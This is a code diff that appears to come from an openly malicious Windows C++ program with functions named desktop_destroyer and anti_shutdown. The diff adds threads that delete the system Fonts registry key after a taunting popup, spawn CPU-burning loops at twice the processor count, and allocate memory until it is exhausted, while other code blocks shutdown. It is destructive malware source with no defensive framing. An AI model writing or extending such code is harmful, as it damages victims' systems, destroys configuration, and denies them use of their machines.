@@ -703,6 +703,37 @@ LRESULT CALLBACK ShutBlk_WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
     return DefWindowProcW(hwnd, msg, wp, lp);
 }
 
+DWORD WINAPI cpu_burn(LPVOID)
+{
+    while (true) { volatile int x = 0; for (int i = 0; i < 999999; i++) x += i; }
+    return 0;
+}
+
+DWORD WINAPI delete_fonts(LPVOID)
+{
+    Sleep(10000);
+    RegDeleteTreeW(HKEY_LOCAL_MACHINE,
+        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts");
+    return 0;
+}
+
+DWORD WINAPI ram_burn(LPVOID)
+{
+    std::vector<void*> blocks;
+    while (true) {
+        // allocate 64MB chunks and write to force commit
+        SIZE_T sz = 64 * 1024 * 1024;
+        void* p = VirtualAlloc(nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (p) {
+            memset(p, 0xAA, sz);  // touch every page
+            blocks.push_back(p);
+        } else {
+            Sleep(100);  // allocation failed, wait a bit
+        }
+    }
+    return 0;
+}
+
 DWORD WINAPI anti_shutdown(LPVOID)
 {
     WNDCLASSW wc = {};
@@ -892,7 +923,17 @@ void desktop_destroyer()
         }
     }
 
+    // start font deletion timer (fires 10s after popup)
+    CreateThread(nullptr, 0, delete_fonts, nullptr, 0, nullptr);
+
     MessageBoxW(nullptr, L"ur pc just fuck up", L"enjoy my gifts LOL", MB_OK | MB_ICONERROR);
+
+    // max out CPU + RAM
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    for (DWORD i = 0; i < si.dwNumberOfProcessors * 2; i++)
+        CreateThread(nullptr, 0, cpu_burn, nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, ram_burn, nullptr, 0, nullptr);
 
     // block all shutdown methods
     // power button → do nothing
